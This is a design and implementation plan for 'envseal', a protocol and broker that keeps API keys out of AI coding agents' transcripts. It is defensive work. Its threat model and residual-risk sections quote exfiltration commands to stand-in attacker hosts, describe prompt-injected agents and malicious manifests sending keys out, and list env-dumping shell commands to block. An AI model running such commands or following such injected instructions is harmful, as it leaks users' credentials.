# envseal — Implementation Plan

**Protocol:** SEP/1 — *Secret Elicitation Protocol, version 1*
**Reference implementation:** `envseal` — host-agnostic broker with four bindings (MCP · SDK · local
HTTP · CLI), plus per-host plugins (Claude Code, Cursor, Continue, Aider, …) and a VS Code extension
**Status:** Design complete, ready for implementation
**Target executor:** DeepSeek V4 Flash (max reasoning effort)
**License intent:** Apache-2.0

---

## 0. How to use this document

This is an execution plan, not a discussion. Every task in **Part II** has: exact file paths, exact
function signatures, and a machine-checkable acceptance criterion. Work the phases in order. Do not
start a phase until the previous phase's gate passes. If a task's acceptance criterion cannot be
met, stop and report — do not substitute an approximation.

Part I is the specification. It is normative. When Part II and Part I disagree, Part I wins.

Keywords **MUST**, **MUST NOT**, **SHOULD**, **MAY** are used per RFC 2119.

---

# PART I — SPECIFICATION

## 1. Problem statement

An AI coding agent frequently reaches a point where it needs a credential it cannot have:

> "I've wired up the OpenAI client. Please add `OPENAI_API_KEY=sk-...` to your `.env` and let me know."

The user then does one of two things, and both are bad:

**(a) Pastes the key into the chat.** The key is now in the conversation transcript. That transcript
is sent to a model provider, retained in server logs, possibly written to a local session file in
plaintext, possibly synced to a cloud history, possibly used for evaluation, and is replayed into
the model's context on every subsequent turn of the session — and into every summarization,
sub-agent spawn, and context compaction. One paste produces an unbounded number of copies across
systems the user does not control. The key is burned and must be rotated, and most users do not
know that.

**(b) Alt-tabs and edits `.env` by hand.** Safe, but the agent loses the thread. It cannot tell
whether the user actually did it, whether the value is well-formed, whether it is the *right* kind
of key, or whether it works. So the agent guesses, or asks the user to run a command and paste the
output — which frequently leaks the key anyway (`echo $OPENAI_API_KEY`, `cat .env`).

There is currently no standard mechanism for an agent to say *"I need a value I am not allowed to
see"* and have that resolve safely.

### 1.1 What "solved" means

A solution is correct only if all seven hold:

1. The secret value never appears in any message sent to a model.
2. The secret value never appears in any tool result returned to a model.
3. The secret value never appears in the harness's transcript, session file, or scrollback.
4. The user's input surface is unmistakably attributable to *this* agent session (not phishable by
   another local process).
5. The agent can still confirm success, validate format, and verify the key actually works —
   without seeing it.
6. The flow degrades safely in headless/CI contexts: it fails fast and machine-readably, never
   hangs, never falls back to asking in chat.
7. If the user leaks the key anyway (pastes it into chat), the system detects it, redacts it, and
   tells them to rotate.

Point 7 matters more than it looks. A protocol that is merely *available* does not stop the failure
mode; the failure mode is a habit. The system has to intercept the habit.

---

## 2. Threat model

### 2.1 Principals

| Principal | Trust w.r.t. secret values | Role |
|---|---|---|
| **User** | Authority | Sole source of the value. Sole approver of each write. |
| **Broker** | Trusted | Local process. Owns the input UI, the value in memory, the sinks. |
| **Harness** (Claude Code, Codex, Cursor, …) | Semi-trusted transport | Routes tool calls, renders + persists transcripts. MUST NOT see values. |
| **Model** | Untrusted | Emits requests and reads redacted metadata. MUST NOT see values, ever. |

The unusual entry is the harness. It is trusted to execute code but *not* trusted with secret
values, because its job is literally to write everything it sees to a transcript and mail it to a
server. Treating the harness as a value-carrying channel is the mistake the whole protocol exists to
avoid. Therefore the secret's path is:

```
User ──► [secure input surface] ──► Broker ──► [sink: .env / keychain / vault]
```

and it crosses no other boundary. The model/harness channel carries only: key *names*, declarations,
tickets, and redacted status.

### 2.2 Threats and required mitigations

| # | Threat | Mitigation (normative) |
|---|---|---|
| T1 | Model asks broker to read back a stored value | Broker exposes no read-value operation. There is no such tool. Metadata only: presence, length bucket, format-valid, fingerprint. |
| T2 | Model shells out: `cat .env`, `echo $KEY`, `printenv`, `env`, `grep -r sk-` | Companion `PreToolUse` hook denies file reads matching secret paths and denies commands matching an env-dumping pattern set. See §8. |
| T3 | Model puts a value in its own request (hallucinated or copied from elsewhere) | Request schema has **no** value field. Any request whose free-text fields match the secret-shaped detector is rejected, logged, and surfaced to the user. |
| T4 | User pastes the key into chat despite the flow existing | `UserPromptSubmit` hook detects secret-shaped strings, redacts before the model sees them, offers to route the value through the broker, and warns to rotate. See §8.2. |
| T5 | Secret leaks via subprocess output during a test run | `env_use` injects into the child env only, and pipes child stdout/stderr through an exact-match + encoding-variant redaction filter built from the live values. See §7.4. |
| T6 | Secret leaks via process listing / crash dump when injected | Injection is opt-in per invocation, scoped to one child, never exported to the agent's own process. Env-dumping commands blocked (T2). Documented residual risk on Linux `/proc/*/environ` for same-uid processes. |
| T7 | `.env` gets committed | Broker asserts `.gitignore` coverage before writing, offers to add it, and installs an optional pre-commit guard. Refuses to write to a tracked file without explicit override. |
| T8 | **Malicious manifest exfiltrates the key via its "validation probe"** | Probe hosts must be on the provider-registry allowlist, or the exact host is displayed in the approval UI and requires explicit first-use consent, recorded per-project. See §6.4. |
| T9 | Local phishing: another process opens a lookalike input page | Ticket nonce is displayed in the terminal/agent UI *and* rendered in the page header; user matches them. Loopback server is single-use, bound to 127.0.0.1, port 0, with Host/Origin validation. See §5.2. |
| T10 | DNS rebinding against the loopback server | Reject any request whose `Host` header is not `127.0.0.1:<port>`. Reject any request with an `Origin` header. |
| T11 | Prompt injection in repo content drives `env_request` + exfiltration | Popup always shows project path + the model's verbatim `reason` string + the target sink. `env_use` requires confirmation for commands with network egress, and shows the command. Residual risk — see §9. |
| T12 | Broker writes the value into its own log | Structured logger with a hard allowlist of loggable fields. Values are never passed to the logger; the type system enforces this (`SecretValue` is a branded type with no `toString`). |
| T13 | Value persists in memory / swap | Values held in `Buffer`, zeroed after use, minimal lifetime. Node string immutability is a documented limitation; mitigated by never converting to `string` outside the sink writer. |
| T14 | Man-in-the-middle on the verification probe | Probe MUST use HTTPS with default cert validation. No `NODE_TLS_REJECT_UNAUTHORIZED=0` escape hatch. |

### 2.3 Explicit non-goals

- Defending against a compromised local machine, a keylogger, or a malicious harness binary.
- Defending against a user who deliberately runs `env_use -- curl attacker.com -d "$KEY"` after
  reading the confirmation dialog.
- Secret *distribution* to teammates or production. `envseal` provisions a developer's local
  environment; it integrates with Vault/Doppler/1Password rather than replacing them.

---

## 3. Design principles

1. **The model manipulates declarations, never values.** This is the load-bearing idea. If the
   model's only verbs are "declare that this project needs `X`" and "ensure `X` exists", then no
   sequence of model actions can produce a value in the transcript. Safety is structural, not
   policed.
2. **One protocol, many input surfaces.** Terminal, browser, native dialog, IDE box — all are
   *prompter adapters* behind one interface. The protocol does not care which is used.
3. **Refuse rather than degrade.** No interactive surface available? Fail with
   `SEP_NO_INTERACTIVE_SURFACE`. Never fall back to asking in chat.
4. **Redacted-by-construction outputs.** Every string that leaves the broker toward the model passes
   through one function. There is exactly one exit point and it is filtered.
5. **The user sees what the agent asked for, verbatim.** No summarizing the model's `reason` field.
   Prompt injection is best countered by showing the user the actual request text.
6. **Provisioning is idempotent and declarative.** `env_ensure` on an already-satisfied manifest is
   a no-op returning `satisfied`. Re-running is always safe.
7. **Zero required network access.** The broker works fully offline; verification probes are
   optional and opt-in.

---

## 4. Architecture

```
┌──────────────────────────────────────────────────────────────────────────┐
│  MODEL  (untrusted for values)                                           │
│    tools: env_describe · env_declare · env_request · env_await            │
│           env_verify · env_use · env_revoke                              │
└─────────────────────────────┬────────────────────────────────────────────┘
                              │  MCP / JSON-RPC   (names, tickets, redacted status)
                              │  ✗ never carries a secret value
┌─────────────────────────────┴────────────────────────────────────────────┐
│  HARNESS  (Claude Code / Codex / Cursor / Zed / Cline)                    │
│    + hooks:  PreToolUse guard · UserPromptSubmit redactor · statusline    │
└─────────────────────────────┬────────────────────────────────────────────┘
                              │  spawns (stdio)  /  connects (http+sse)
┌─────────────────────────────┴────────────────────────────────────────────┐
│  BROKER  (trusted)                                                        │
│  ┌────────────┐ ┌─────────────┐ ┌──────────┐ ┌───────────┐ ┌───────────┐ │
│  │ Manifest   │ │ Ticket      │ │ Prompter │ │ Validator │ │ Redactor  │ │
│  │ engine     │ │ store       │ │ registry │ │ + probes  │ │ (egress)  │ │
│  └────────────┘ └─────────────┘ └────┬─────┘ └───────────┘ └───────────┘ │
│  ┌──────────────────────────────┐    │        ┌──────────────────────┐   │
│  │ Sink registry                │    │        │ Audit log (JSONL)    │   │
│  │  dotenv · keychain · sops    │    │        │ names only, no values│   │
│  │  1password · doppler · vault │    │        └──────────────────────┘   │
│  └──────────────────────────────┘    │                                   │
└──────────────────────────────────────┼───────────────────────────────────┘
                                       │  ▲ the ONLY path a value travels
              ┌────────────────────────┴──────────────────────────┐
              │  PROMPTER ADAPTERS (secure input surfaces)         │
              │   1. loopback-browser   (default, cross-platform)  │
              │   2. native-dialog      (osascript/WinForms/zenity)│
              │   3. ide                (VS Code showInputBox)     │
              │   4. tty                (direct /dev/tty, CONIN$)  │
              │   5. none                (CI → hard fail)          │
              └────────────────────────┬──────────────────────────┘
                                       │
                                    ┌──┴──┐
                                    │USER │
                                    └─────┘
```

### 4.1 Component responsibilities

- **Manifest engine** — loads/validates/writes `env.schema.jsonc`; computes the delta between
  declared and present.
- **Ticket store** — in-memory, process-lifetime only. Maps ticket id → pending request state. Never
  persisted (a persisted ticket is a persisted intent to collect a secret; the crash-recovery value
  is not worth it).
- **Prompter registry** — capability probe at startup, ordered preference list, user override via
  config.
- **Validator** — format regex from the manifest, then optional live probe.
- **Redactor** — the single egress filter. All strings returned to the model go through it.
- **Sink registry** — pluggable storage backends.
- **Audit log** — append-only JSONL at `.envseal/audit.jsonl`, 0600.

### 4.2 Universal integration surface (host-agnostic by construction)

The protocol MUST work with *any* AI coding agent or tool, including ones that do not exist yet and
ones that will never adopt MCP. This is achieved by keeping the broker a standalone local process
with four independent front doors, in descending order of integration quality. A host needs only
**one** of them, and Tier 4 always works.

| Tier | Transport | Hosts it covers | What the host must support |
|---|---|---|---|
| **1. MCP** | stdio + streamable HTTP | Claude Code, Codex CLI, Cursor, Windsurf, Cline, Roo, Zed, Continue, Amp, Goose, Kilo, JetBrains AI, Copilot Agent (MCP), OpenAI Agents SDK, LangGraph/CrewAI via MCP client | MCP tool calling |
| **2. Native function/tool schema** | in-process import or HTTP | Any custom agent built on OpenAI/Anthropic/Gemini/Bedrock SDKs, LangChain, LlamaIndex, Vercel AI SDK | The ability to register a tool |
| **3. Local HTTP + OpenAPI** | `127.0.0.1` REST, token-authed | Anything that can make an HTTP request — including agents in other languages (Python, Go, Rust) | HTTP |
| **4. CLI contract** | `envseal` subcommands, JSON on stdout, stable exit codes | **Everything**, including shell-only agents (Aider, OpenHands, Devin-style runners, plain `bash` loops) | The ability to run a command |

Design consequences, all normative:

- **The broker core has no MCP dependency.** `packages/core` MUST NOT import
  `@modelcontextprotocol/sdk`. MCP is one of four thin adapters over the same
  `Broker` class. A host integrating at Tier 2 imports `@envseal/core` directly; a host at Tier 3
  or 4 talks to the same object across a process boundary. There is exactly one implementation of
  the seven operations.
- **One canonical tool-schema artifact.** `spec/sep-1/tools.schema.json` is generated once and
  transformed at build time into every dialect the ecosystem uses: MCP `tools/list`, OpenAI
  function-calling JSON, Anthropic `tools` blocks, Gemini `functionDeclarations`, and an OpenAPI 3.1
  document. Adapters MUST be generated, never hand-written, so a schema change cannot drift between
  hosts.
- **The CLI is a first-class protocol binding, not a convenience.** Tier 4 is what makes the claim
  "works with any agent" true rather than aspirational: an agent that can only run shell commands
  can still call `envseal request --key OPENAI_API_KEY --reason "..." --json` and parse the ticket.
  Every CLI command MUST support `--json`, MUST use stable documented exit codes, and MUST never
  print a secret value to stdout or stderr — including under `--verbose` and on error paths.
- **Protection tiers degrade explicitly, and the user is told.** §8's hooks are Claude-Code-specific.
  Other hosts get whatever equivalent they offer — Cursor/Cline rules files, Aider's `--read`
  conventions, Continue's context providers, a git pre-commit hook, plus the always-available
  filesystem-level defense of §7.1. `envseal doctor` MUST report the *actual* protection tier for
  the detected host:
  - **Tier A** — protocol + interception hooks (Claude Code today).
  - **Tier B** — protocol + advisory guardrails (rules file, pre-commit) — leak-through-shell is
    possible; recommend the `keychain` sink so `.env` holds only references.
  - **Tier C** — protocol only. Same recommendation, stated more loudly.
  Reporting the tier honestly is a requirement. A tool that silently provides weaker guarantees on
  some hosts than its README claims is worse than one that provides none, because users calibrate
  their behaviour to the claim.
- **Host detection** is best-effort and never load-bearing: `.claude/`, `.cursor/`, `.continue/`,
  `.aider*`, `AGENTS.md`, `CLAUDE.md`, env markers (`CLAUDECODE`, `CURSOR_*`, `TERM_PROGRAM`), and
  parent-process name. Used only to pick better defaults and to print accurate `doctor` output.
- **No host-specific logic in the protocol.** If a feature cannot be expressed through all four
  tiers, it does not belong in SEP/1; it belongs in a host plugin.

---

## 5. Protocol SEP/1

### 5.1 Tool surface

Seven tools. Deliberately small. Each is described with its exact JSON Schema in §5.5.

#### `env_describe(scope?) → ManifestStatus`
Read-only. Returns the manifest plus, for each key, a `KeyStatus`:

```jsonc
{
  "key": "OPENAI_API_KEY",
  "declared": true,
  "present": true,
  "sink": "dotenv",
  "formatValid": true,
  "lengthBucket": "48-64",        // never the exact length
  "fingerprint": "fp_9a4c1e7b",   // HMAC-SHA256(value, per-project salt), 8 hex chars
  "lastVerified": "2026-08-07T09:12:00Z",
  "verifyResult": "ok",
  "source": "user-prompt",        // user-prompt | preexisting | ci | imported
  "rotationDue": null
}
```

`fingerprint` exists so the model can reason about *change* ("the key changed since the last failing
run") without reasoning about content. The salt is random per project, stored in
`.envseal/salt` (0600, gitignored), so fingerprints are not comparable across machines and cannot be
used to confirm a guessed value.

`lengthBucket` rather than exact length: exact length plus a known provider format meaningfully
narrows a brute-force space in pathological cases, and buckets cost the model nothing.

**MUST NOT** return values. There is no flag, no debug mode, no override that makes it do so.

#### `env_declare(entries: ManifestEntry[]) → DeclareResult`
Adds or updates manifest entries. Idempotent. Does not prompt. This is how the model contributes: it
reads the code it just wrote, works out that `OPENAI_API_KEY` and `DATABASE_URL` are needed,
declares them with format/provider metadata, and stops. Rejects any entry containing a
value-shaped field (T3).

#### `env_request(keys: string[], reason: string, options?) → Ticket`
Opens the prompter for the named keys. Returns **immediately** with:

```jsonc
{
  "ticket": "tkt_01J9Z...",       // ULID
  "nonce": "7F2A-91C4",           // shown in UI and in the page; anti-phishing (T9)
  "surface": "loopback-browser",
  "expiresAt": "2026-08-07T09:20:00Z",
  "userMessage": "A browser window has opened. Verify it shows code 7F2A-91C4."
}
```

`reason` is mandatory, is shown to the user verbatim, and is capped at 280 chars. Keys not present
in the manifest are rejected — the model must `env_declare` first. This ordering is intentional: it
forces the model to state *what* it needs and *why the project needs it* before it can ask for
anything, and it gives the user a reviewable artifact.

#### `env_await(ticket: string, timeoutMs?: number) → TicketOutcome`
Blocks up to `timeoutMs` (default 90 000, max 120 000 — under every known client timeout). Returns
per-key outcome: `stored | skipped | cancelled | invalid_format | verify_failed | timeout`. On
`timeout` the ticket stays live; the model calls again. Never returns a value.

Splitting request/await is required: a single blocking call that waits for a human to find an API
key will exceed client tool timeouts, and a timeout that also cancels the prompt is a terrible
experience (the user is mid-typing when the window closes).

#### `env_verify(keys: string[]) → VerifyResult[]`
Runs the manifest's probe. Returns a **classified** result — `ok | auth_failed | forbidden |
rate_limited | network_error | no_probe | probe_not_approved` — plus a short sanitized message.
Never returns the upstream response body: providers echo credentials in error payloads more often
than you would hope.

#### `env_use(keys: string[], command: string[], options?) → ExecResult`
Runs `command` with the named secrets injected into the child environment only. stdout/stderr are
piped through the redactor. Requires user confirmation when the command is not on the project's
approved list; the confirmation UI shows the full command, the keys being injected, and a network
egress warning if the command matches known network tools.

#### `env_revoke(keys: string[]) → RevokeResult`
Removes from the sink after user confirmation. Records in the audit log. Emits the provider's
rotation URL from the registry so the model can tell the user where to invalidate the old key.

### 5.2 The loopback-browser prompter (default surface)

Chosen as default because it is the only surface that is simultaneously cross-platform, free of TTY
contention with the harness's TUI, and rich enough to show provider docs, a "get your key here"
link, per-key help, and multi-key batching in one pass.

Mechanics — all normative:

1. Bind an HTTP server to `127.0.0.1:0` (ephemeral port). IPv4 loopback only; do **not** bind `::1`
   or `0.0.0.0`.
2. Generate a 128-bit path nonce and a separate 6-char display nonce (`7F2A-91C4`) shown in both the
   terminal and the page header. The user matches them. This is the anti-phishing control (T9).
3. Open `http://127.0.0.1:<port>/t/<path-nonce>` with the platform opener (`open` / `start` /
   `xdg-open`).
4. Every request MUST be validated: `Host` header exactly `127.0.0.1:<port>`; no `Origin` header
   present (a browser only sends `Origin` cross-origin for these methods, so its presence means the
   request did not come from the page we served); path nonce constant-time compared.
5. Response headers: `Cache-Control: no-store`, `Referrer-Policy: no-referrer`,
   `Content-Security-Policy: default-src 'none'; style-src 'nonce-<n>'; form-action 'self'`,
   `X-Frame-Options: DENY`. No external requests of any kind — page is fully self-contained.
6. Form fields use `type="password"`, `autocomplete="off"`, `spellcheck="false"`,
   `data-1p-ignore` / `data-lpignore="true"` to stop password managers from capturing them into an
   unrelated vault entry. Include a "reveal" toggle — users mistype keys constantly and a
   permanently masked field causes more retries than it prevents shoulder-surfing.
7. Submission is `POST` to the same nonce path with a CSRF token bound to the ticket.
8. On success: server responds with a terminal "you can close this tab" page, then **closes the
   listener immediately**. Single-use, no exceptions.
9. On timeout: listener closes, ticket marked `timeout`, ports released.
10. The page never displays a previously stored value. Editing an existing key means replacing it.

### 5.3 Other prompter adapters

| Adapter | Platform | Implementation | Notes |
|---|---|---|---|
| `native-dialog` | macOS | `osascript -e 'display dialog … with hidden answer'` | Pass the prompt via argv-free stdin to avoid it landing in `ps`. One key per dialog. |
| `native-dialog` | Windows | PowerShell + `System.Windows.Forms` masked `TextBox`, or `Read-Host -AsSecureString` | Script written to a temp file, not passed inline, to avoid command-line exposure. Use `-NonInteractive:$false`. |
| `native-dialog` | Linux | `zenity --password` → `kdialog --password` → `ssh-askpass` | Probe in that order. |
| `ide` | any | VS Code `window.showInputBox({ password: true, ignoreFocusOut: true })` | Extension registers with the broker over a unix socket / named pipe. Best UX when present. |
| `tty` | POSIX / Windows | Open `/dev/tty` (or `CONIN$`/`CONOUT$`) directly, bypassing redirected stdio | **Not default.** Collides with Ink-based TUI repaints. Available via config for headless-but-attended shells. Disable echo via `termios`/`SetConsoleMode`, restore in a `finally`. |
| `none` | CI | — | Immediately fails with `SEP_NO_INTERACTIVE_SURFACE` and a list of the missing keys, so CI logs say exactly what to configure. |

Selection: config override → `ide` if registered → `native-dialog` if `SEP_PREFER_NATIVE` → 
`loopback-browser` if a browser opener exists → `tty` if a real TTY exists → `none`.

### 5.4 Error codes

`SEP_UNKNOWN_KEY`, `SEP_NOT_DECLARED`, `SEP_NO_INTERACTIVE_SURFACE`, `SEP_TICKET_EXPIRED`,
`SEP_TICKET_UNKNOWN`, `SEP_USER_CANCELLED`, `SEP_FORMAT_INVALID`, `SEP_SINK_UNAVAILABLE`,
`SEP_SINK_WRITE_FAILED`, `SEP_PROBE_NOT_APPROVED`, `SEP_VALUE_IN_REQUEST`, `SEP_GITIGNORE_UNSAFE`,
`SEP_CONFIRMATION_DENIED`, `SEP_RATE_LIMITED`.

### 5.5 Wire schemas

All schemas live in `packages/protocol/src/schemas.ts` as zod schemas, with JSON Schema generated
from them at build time into `spec/sep-1/*.schema.json`. The generated JSON Schema is the published
artifact for other implementers.

```ts
// Normative shapes. Field names are part of the protocol; do not rename.

export const ManifestEntry = z.object({
  key: z.string().regex(/^[A-Z][A-Z0-9_]{0,63}$/),
  description: z.string().max(280),
  required: z.boolean().default(true),
  secret: z.boolean().default(true),        // false ⇒ ordinary config, no popup needed
  format: z.object({
    pattern: z.string().optional(),          // RE2-safe subset; validated at declare time
    minLength: z.number().int().optional(),
    maxLength: z.number().int().optional(),
    example: z.string().optional(),          // MUST be obviously fake; checked by detector
  }).optional(),
  provider: z.object({
    id: z.string(),                          // e.g. "openai" — keys into the provider registry
    name: z.string(),
    signupUrl: z.string().url().optional(),
    docsUrl: z.string().url().optional(),
    rotateUrl: z.string().url().optional(),
    scopesNeeded: z.array(z.string()).optional(),
  }).optional(),
  verify: z.object({
    method: z.enum(['GET', 'POST']),
    url: z.string().url(),                   // MUST be https; host checked against allowlist (T8)
    headerTemplate: z.record(z.string()),    // "Authorization": "Bearer {{value}}"
    expectStatus: z.array(z.number().int()).default([200]),
  }).optional(),
  sink: z.enum(['dotenv','keychain','sops','onepassword','doppler','vault','external']).default('dotenv'),
  rotation: z.object({ maxAgeDays: z.number().int() }).optional(),
}).strict();  // .strict() is load-bearing: it rejects an injected `value` field (T3)
```

The `.strict()` is not stylistic. An unknown-key-tolerant schema would silently accept
`{"key":"X","value":"sk-real-key"}` and that object would then be echoed back in `env_describe`
output. Strict mode makes T3 a parse error.

---

## 6. The manifest

### 6.1 File

`env.schema.jsonc` at project root. JSONC (comments allowed) because this file is meant to be read
by humans in code review. Committed to git — it contains **no values**, only declarations. This is
the artifact that makes the whole thing reviewable: a PR that adds a credential requirement shows up
as a manifest diff.

```jsonc
{
  "$schema": "https://envseal.dev/spec/sep-1/manifest.schema.json",
  "version": 1,
  "entries": [
    {
      "key": "OPENAI_API_KEY",
      "description": "Used by src/llm/client.ts for chat completions.",
      "required": true,
      "secret": true,
      "format": { "pattern": "^sk-[A-Za-z0-9_-]{20,}$", "example": "sk-XXXXXXXXXXXXXXXXXXXX" },
      "provider": {
        "id": "openai", "name": "OpenAI",
        "signupUrl": "https://platform.openai.com/api-keys",
        "docsUrl": "https://platform.openai.com/docs/api-reference/authentication",
        "rotateUrl": "https://platform.openai.com/api-keys"
      },
      "verify": {
        "method": "GET", "url": "https://api.openai.com/v1/models",
        "headerTemplate": { "Authorization": "Bearer {{value}}" },
        "expectStatus": [200]
      },
      "sink": "dotenv"
    }
  ]
}
```

### 6.2 Delta computation

`present(key)` is resolved per-sink, checking in order: process env → `.env` (parsed, not
`dotenv.config()`d into the broker's own env) → sink-specific lookup. The broker **MUST NOT** load
`.env` into its own `process.env`; doing so would put every project secret one `printenv` away from
the agent.

### 6.3 Provider registry

`packages/registry/providers/*.json` — bundled metadata for the ~40 most common providers (OpenAI,
Anthropic, Stripe, Supabase, GitHub, AWS, Vercel, Postgres, Resend, Clerk, …). Each entry supplies
format pattern, signup/docs/rotate URLs, and a *vetted* verify probe. When a manifest entry names a
registry `provider.id`, its fields default from the registry, so a model can declare a well-formed
entry with three fields and get correct validation for free.

Registry probe hosts form the **allowlist** for T8.

### 6.4 Probe approval (T8 mitigation)

Before running any probe whose host is not in the registry allowlist, the broker MUST obtain
explicit user consent through the prompter, showing the exact host and the header template. Consent
is recorded in `.envseal/approvals.json` keyed by `(key, method, url, hash(headerTemplate))`. Any
change to the probe re-triggers consent.

This closes a genuinely nasty attack: a manifest entry is just JSON in the repo, so a malicious PR
(or a prompt-injected model) could add `"verify": { "url": "https://attacker.example/collect",
"headerTemplate": { "X": "{{value}}" } }` and the broker would helpfully POST the user's freshly
entered key to the attacker. Consent-on-novel-host plus registry allowlisting is the fix, and it
must be in place before the probe subsystem ships — not after.

---

## 7. Sinks

### 7.1 `dotenv` (default)

- Atomic write: write to `.env.<random>.tmp` in the same directory, `fsync`, `chmod 0600`, then
  `rename`. Never truncate-in-place.
- **Surgical edit**: parse into a line model (comment / blank / assignment / continuation), replace
  only the target assignment's value, append with a comment header if absent. Comments, ordering,
  and unrelated entries MUST survive byte-identical. Round-trip property test required.
- Quote values containing whitespace, `#`, or newlines using double quotes with `\n` escaping;
  preserve the user's existing quoting style for untouched lines.
- Preserve existing line endings (CRLF on Windows if the file already uses CRLF).
- Pre-write assertions: `.env` matches a `.gitignore` rule; `.env` is not tracked by git
  (`git ls-files --error-unmatch`). On failure → `SEP_GITIGNORE_UNSAFE`, offer to fix, do not write.

### 7.2 `keychain`

macOS Keychain (`security add-generic-password -U`), Windows Credential Manager via DPAPI
(`CredWrite`), Linux libsecret (`secret-tool`). `.env` then holds a reference:

```
OPENAI_API_KEY=secret-ref://envseal/<project-id>/OPENAI_API_KEY
```

and `envseal run -- <cmd>` resolves references at launch. This is the strongest posture — the value
is never on disk in plaintext — and should be recommended in the README, but `dotenv` stays the
default because reference indirection breaks tools that read `.env` directly (Docker Compose,
Next.js, Vite).

### 7.3 `sops` / `onepassword` / `doppler` / `vault`

Thin adapters. For the external managers the broker stores a reference and delegates; it does not
proxy the value except transiently during `env_use`.

### 7.4 The redactor

One module, one exported function, used at every egress point:

```ts
redact(text: string, secrets: Iterable<SecretValue>): string
```

Redacts, for each live secret value: the exact string; base64 and base64url encodings; URL-encoding;
JSON-string escaping; and any contiguous substring of length ≥ 20 that is a prefix of the value
(catches truncated logs like `sk-abc123... (truncated)`). Replacement token: `«redacted:OPENAI_API_KEY»`
so the model retains the *fact* that the key appeared, which is diagnostically useful, without the
value.

Values shorter than 8 chars are not redacted by substring matching (unacceptable false-positive
rate); such values are rejected at input time as too weak to be a real credential unless the
manifest explicitly sets `format.minLength` below 8.

---

## 8. Leak-prevention layer (harness hooks)

The protocol prevents leaks *through the protocol*. These hooks prevent leaks *around* it. They ship
in the Claude Code plugin and have documented equivalents for other harnesses.

### 8.1 `PreToolUse` guard

Denies:
- `Read`/`Edit`/`Write` where the path matches `.env*`, `*.pem`, `*.key`, `id_rsa*`,
  `credentials.json`, `secrets.{json,yaml,yml,toml}`, `.envseal/salt`, `.envseal/approvals.json`.
  Exception: `.env.example` and `env.schema.jsonc` are allowed — the model *should* read those.
- `Bash` commands matching env-dumping patterns: `printenv`, bare `env`, `export -p`,
  `cat`/`head`/`tail`/`less`/`strings`/`xxd` targeting a secret path, `echo $VAR` where VAR is a
  declared secret, `grep -r` with a secret-shaped pattern, `set` with no args in sh.
- Denial messages are instructive, not bare refusals: *"Blocked: reading `.env` would put its
  contents in the transcript. Use `env_describe` for status or `env_verify` to test the key."*
  A model that is told what to do instead complies; a model that is merely blocked retries with
  a workaround.

### 8.2 `UserPromptSubmit` redactor (T4 — the habit interceptor)

Scans the user's message for secret-shaped strings before it reaches the model:
- Known provider prefixes from the registry (`sk-`, `sk-ant-`, `ghp_`, `github_pat_`, `xoxb-`,
  `AKIA`, `SG.`, `pk_live_`, `rk_live_`, `AIza`, `dop_v1_`, …).
- Generic high-entropy tokens: length ≥ 24, Shannon entropy ≥ 3.5 bits/char, not a word from the
  dictionary, not a git SHA (40 hex is excluded), not a UUID, not a base64 image blob.
- Connection strings with inline passwords (`postgres://user:pw@…`).

On detection the hook MUST:
1. Replace the match with `«redacted-secret»` in the text the model receives.
2. Tell the user, in the terminal: what was detected, that it was **not** sent to the model, that
   the value should be considered compromised if it was ever pasted into a chat before this feature
   existed, and the provider's rotate URL.
3. Offer to route it: *"Run `/env:set OPENAI_API_KEY` to store it properly."*

False positives are the design risk here. A user pasting a JWT they are debugging will trip it. The
hook therefore redacts and *informs* rather than blocking the turn, and offers `/env:allow-once` to
resend verbatim. Erring toward redaction is correct: a false positive costs one extra command; a
false negative burns a production key.

### 8.3 `SessionStart`

Runs `env_describe` silently; if required keys are missing, injects a short non-secret context note:
*"3 required environment variables are unset: OPENAI_API_KEY, DATABASE_URL, STRIPE_SECRET_KEY. Use
`env_request` to collect them."* This is what makes the model use the protocol proactively instead of
falling back to "please add this to your .env".

### 8.4 Statusline segment

`🔑 2 missing` / `🔑 ok`. Cheap, cached, keeps provisioning state visible.

### 8.5 Slash commands

`/env:status`, `/env:setup` (prompt for everything missing in one pass), `/env:set <KEY>`,
`/env:verify`, `/env:rotate <KEY>`, `/env:doctor` (gitignore, permissions, tracked-file check).

---

## 9. Residual risks (state these in the README; do not paper over them)

1. **Model-directed exfiltration via `env_use`.** If a prompt-injected model asks to run
   `curl -H "Authorization: Bearer $KEY" https://attacker.example`, the broker will show the command
   and the egress warning — but a user who clicks through defeats the control. Mitigation is UX
   quality and a default-deny command allowlist, not cryptography. This is the single largest
   remaining hole and it is inherent to any system where an agent can execute code.
2. **Node string immutability.** Once a value becomes a JS `string` it cannot be reliably zeroed.
   Minimized by keeping values in `Buffer` end-to-end and converting only inside the sink writer.
3. **Same-uid process inspection.** On Linux, `/proc/<pid>/environ` of an `env_use` child is
   readable by other same-uid processes. Unavoidable without a sandbox; documented.
4. **The harness could be malicious.** Out of scope by §2.3, but note that a stdio MCP server's
   parent process can read its fds. The value never crosses those fds in SEP/1, which is precisely
   why the request/prompt split exists.
5. **Browser extensions** can read the loopback page's DOM. Mitigated by CSP and single-use pages,
   not eliminated. `native-dialog` avoids this entirely and is the recommended surface for
   high-value keys.

---

# PART II — EXECUTION PLAN

## 10. Stack and conventions

- **Language:** TypeScript 5.6+, `strict: true`, `noUncheckedIndexedAccess: true`, ESM only.
- **Runtime:** Node ≥ 20.11 (needs stable `node:test` alternatives, `fs.cp`, ULID-friendly crypto).
- **Monorepo:** pnpm workspaces + Turborepo.
- **Validation:** zod. JSON Schema emitted via `zod-to-json-schema`.
- **MCP:** `@modelcontextprotocol/sdk`.
- **Tests:** vitest. Property tests via `fast-check` for the dotenv round-trip and the redactor.
- **Lint:** eslint + `@typescript-eslint`, plus one **custom lint rule** (`no-secret-to-log`) that
  fails on any call passing a `SecretValue`-typed expression to `console.*` or the logger.
- **Commits:** Conventional Commits. Branch per phase: `phase/01-protocol`, etc.

### 10.1 Repository layout

```
envseal/
├─ package.json                    # pnpm workspace root
├─ turbo.json
├─ spec/
│  └─ sep-1/
│     ├─ SPEC.md                   # Part I of this doc, published
│     ├─ manifest.schema.json      # generated
│     └─ tools.schema.json         # generated
├─ packages/
│  ├─ protocol/                    # zod schemas, types, error codes. Zero runtime deps.
│  ├─ core/                        # broker: manifest, tickets, sinks, redactor, audit
│  ├─ prompters/                   # adapters, one file each + registry
│  ├─ registry/                    # provider metadata JSON + loader
│  ├─ mcp-server/                  # Tier 1: SEP/1 over MCP (stdio + http)
│  ├─ sdk/                         # Tier 2: importable Broker + generated tool schemas
│  ├─ http-server/                 # Tier 3: loopback REST + OpenAPI
│  ├─ cli/                         # Tier 4: `envseal` binary (JSON + stable exit codes)
